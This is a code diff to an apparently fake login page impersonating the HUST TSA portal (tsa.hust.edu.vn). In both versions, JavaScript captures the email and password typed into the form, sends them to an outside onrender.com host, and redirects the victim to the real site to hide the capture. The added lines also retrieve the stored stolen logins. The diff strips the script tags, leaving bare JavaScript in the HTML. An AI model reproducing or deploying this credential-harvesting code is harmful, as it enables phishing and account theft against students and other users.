@@ -64,25 +64,29 @@
     </div>
 </body>
 
-<script>
-    document.getElementById("login-form").addEventListener("submit", function(event) {
-        event.preventDefault(); // Ngăn chặn reload trang
+document.getElementById("login-form").addEventListener("submit", function(event) {
+    event.preventDefault();
 
-        const email = document.getElementById("email").value;
-        const password = document.getElementById("password").value;
+    const email = document.getElementById("email").value;
+    const password = document.getElementById("password").value;
 
-        fetch("https://tsa-fake-web.onrender.com/save-login", { // Đúng endpoint API
-            method: "POST",
-            headers: { "Content-Type": "application/json" },
-            body: JSON.stringify({ email, password })
-        })
-        .then(response => response.json())
-        .then(() => {
-            window.location.href = "https://tsa.hust.edu.vn/dang-nhap"; // Điều hướng
-        })
-        .catch(error => {
-            console.error("Lỗi khi gửi dữ liệu:", error);
-        });
-    });
-</script>
+    fetch("https://your-app.onrender.com/save-login", {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({ email, password })
+    }).then(response => response.json())
+    .then(() => {
+        window.location.href = "https://tsa.hust.edu.vn/dang-nhap";
+    }).catch(error => console.error("Lỗi:", error));
+});
+
+
+fetch("https://your-app.onrender.com/get-logins")
+    .then(response => response.json())
+    .then(data => {
+        console.log("Danh sách đăng nhập:", data);
+    })
+    .catch(error => console.error("Lỗi lấy dữ liệu:", error));
+
+
 </html>
